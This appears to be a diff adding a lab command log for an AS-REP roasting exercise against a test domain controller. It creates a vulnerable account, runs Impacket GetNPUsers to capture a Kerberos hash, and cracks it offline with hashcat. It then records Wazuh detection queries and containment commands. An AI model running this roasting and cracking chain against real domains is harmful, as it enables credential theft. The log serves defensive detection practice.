@@ -1,0 +1,42 @@
+# Kali commands — SOC-Case-ASREP-Roasting (192.168.100.107 -> DC 192.168.100.105, domain BRYLL.LOCAL)
+# Actual commands run. Impacket v0.13.1.
+
+# --- DC setup (PowerShell, Administrator) — vulnerable account ---
+New-ADUser -Name svc_file -SamAccountName svc_file -Enabled $true -PasswordNeverExpires $true -AccountPassword (ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+Set-ADAccountControl -Identity svc_file -DoesNotRequirePreAuth $true
+Get-ADUser svc_file -Properties DoesNotRequirePreAuth, UserAccountControl
+#   UAC 4260352 (0x410200) = DONT_REQUIRE_PREAUTH(0x400000)+DONT_EXPIRE_PASSWORD(0x10000)+NORMAL_ACCOUNT(0x200)
+#   SID S-1-5-21-1845810679-4027539410-2363447484-1603
+
+# --- Step 1: time sync (Kerberos <5 min skew) ---
+sudo systemctl stop systemd-timesyncd
+sudo ntpdate 192.168.100.105
+#   2026-11-04 09:42:05 (-0500) -180.107310 ... CLOCK: time stepped by -180.107310 (Kali ~3 min fast)
+sudo date    # Wed Nov 4 09:42:05 AM EST 2026
+
+# --- Step 2: enumerate + roast (AS-REQ without pre-auth) ---
+# (enum-only, no hash capture: run without -request)
+GetNPUsers.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105
+# roast + save hash:
+GetNPUsers.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105 -request -format hashcat -outputfile asrep_hashes.txt
+#   -> svc_file  PasswordLastSet 2026-11-04 09:37:10  LastLogon <never>  UAC 0x410200
+#   -> $krb5asrep$23$svc_file@BRYLL.LOCAL:ed31b62c081173a76b40353846dbae46$...a130baccaa6971571  (etype 23 = RC4)
+cat asrep_hashes.txt
+
+# --- Step 3: crack offline (hashcat mode 18200 = Kerberos 5 etype 23 AS-REP) ---
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --show
+#   Status: Cracked, Recovered 1/1, 325.0 kH/s, 36864/14344385 (0.26%), ~39s -> Password123
+
+# --- Detection (Wazuh, agent Windows-server = DC, index wazuh-archives-*, DQL) ---
+# data.win.system.eventID: 4768  -> 20 hits; malicious row: targetUserName svc_file,
+#   ticketOptions 0x50800000, ipAddress ::ffff:192.168.100.107, ipPort 34658
+# Expanded (eventRecordID 8654): preAuthType 0  <-- SMOKING GUN (normal=2),
+#   ticketEncryptionType 0x17 (RC4), serviceName krbtgt, targetSid ...-1603, status 0x0
+# Baseline normal: DESKTOP-B5RJ6HF6$ 4768 ticketOptions 0x40810010 (pre-auth)
+# Hunting: data.win.system.eventID: 4768 and data.win.eventdata.preAuthType: "0"
+
+# --- Containment (DC) ---
+# Set-ADAccountControl -Identity svc_file -DoesNotRequirePreAuth $false
+# Set-ADAccountPassword -Identity svc_file -Reset -NewPassword (ConvertTo-SecureString '<25+ random>' -AsPlainText -Force)
+# Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}   # audit domain-wide
